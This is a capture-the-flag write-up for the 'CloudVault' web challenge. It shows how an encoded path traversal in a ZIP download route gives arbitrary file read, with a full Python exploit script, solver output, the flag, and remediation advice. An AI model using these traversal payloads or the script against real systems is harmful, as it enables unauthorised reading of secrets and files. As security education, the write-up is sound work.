# CloudVault
---
**Category:** Web  
**Points:** 75  
**Difficulty:** Easy  
**Author:** VBD  
**Target:** `http://ctf.vulnbydefault.com:53129`

## Challenge Description

> A secure drive built specifically for storing backup files

## Summary

The app allows authenticated users to upload ZIP files and browse/download entries through a route similar to:

- `/zip/<archive>.zip/download/<entryPath>`

The vulnerable download endpoint does **not** properly canonicalize/sanitize user-controlled paths and is exploitable via path traversal from ZIP-entry context to host/container filesystem.

This allowed arbitrary file read (LFI), including sensitive files such as `flag.txt`.

---

## Exploitation Chain

### 1) Register + login via GraphQL

CloudVault exposes GraphQL mutations for account creation and login:

- `registerUser(username,password)`
- `loginUser(username,password)`

A random user can be created and authenticated quickly.

### 2) Upload any ZIP file

A benign ZIP (e.g., containing `note.txt`) is enough to create a valid archive context (`sample.zip`) for the vulnerable download route.

### 3) Abuse traversal in ZIP download path

The vulnerable route accepted traversal payloads in the entry path segment:

- `..%2f..%2f..%2f..%2f..%2f<target>`

Example request pattern:

- `/zip/sample.zip/download/..%2f..%2f..%2f..%2f..%2fflag.txt`

The server returned file content from outside intended ZIP scope.

### 4) Enumerate common flag locations

By probing typical paths (`flag.txt`, `/app/flag.txt`, `/root/flag.txt`, etc.), the flag file was found and read.

---

## Working Exploit Script (used during solve)

```python
import requests
import random
import io
import zipfile

BASE = "http://ctf.vulnbydefault.com:53129"
PREFIX = "..%2f..%2f..%2f..%2f..%2f"

s = requests.Session()
user = f"user{random.randint(10000,999999)}"
password = "Pass123!"

qreg = "mutation($u:String!,$p:String!){registerUser(username:$u,password:$p){success}}"
qlog = "mutation($u:String!,$p:String!){loginUser(username:$u,password:$p){success}}"
s.post(f"{BASE}/api/graphql", json={"query": qreg, "variables": {"u": user, "p": password}}, timeout=20)
s.post(f"{BASE}/api/graphql", json={"query": qlog, "variables": {"u": user, "p": password}}, timeout=20)

buf = io.BytesIO()
with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
    zf.writestr("note.txt", "hello")
buf.seek(0)
s.post(f"{BASE}/upload", files={"zipfile": ("sample.zip", buf.getvalue(), "application/zip")}, timeout=30)

paths = [
    "flag.txt", "flag", "app/flag.txt", "root/flag.txt", "home/ctf/flag.txt",
]

for p in paths:
    url = f"{BASE}/zip/sample.zip/download/{PREFIX}{p}"
    r = s.get(url, timeout=20, allow_redirects=False)
    text = r.content.decode("latin1", "ignore")
    if "VBD{" in text:
        print("HIT", p, r.status_code)
        print(text)
        break
```

---

## Solver Output (confirmed)

Command used:

```powershell
& "c:\Users\stxrdust\Desktop\Internships\Deltaware_Solution\venv\Scripts\python.exe" "c:\Users\stxrdust\Desktop\Internships\Deltaware_Solution\_cloudvault_flag_hunt.py"
```

Observed output:

```text
flag.txt status 200 len 54 loc None
VBD{z1p_sl1p_1s_fun_adb2c482c74dadf66562129c16748893}
done
```

## Flag

`VBD{z1p_sl1p_1s_fun_adb2c482c74dadf66562129c16748893}`

---

## Root Cause

- Download endpoint trusts path input from URL without strict normalization.
- No robust check that resolved path remains under intended ZIP extraction/virtual root.
- Encoded traversal (`..%2f`) bypasses route-level assumptions.

## Security Impact

- Arbitrary local file read from container/server context.
- Exposure of secrets, env/config, source code, and flags.
- Potential pivot to deeper compromise depending on readable artifacts.

## Remediation

1. Normalize + decode once, then canonicalize with `realpath`/equivalent.
2. Enforce strict base-dir containment (`resolved.startswith(baseDir)` after canonicalization).
3. Reject `..`, absolute paths, encoded separators, and mixed slash tricks.
4. Do not directly map user path segments to filesystem paths.
5. Add deny-by-default allowlist for downloadable archive entries.
6. Add security tests for traversal payloads (`../`, `%2e%2e%2f`, double-encoding, backslashes).

---

## Notes

Although the challenge title hints at ZIP handling (â€œZip Slipâ€), this solve path was direct traversal/LFI through the ZIP download route rather than archive extraction RCE.

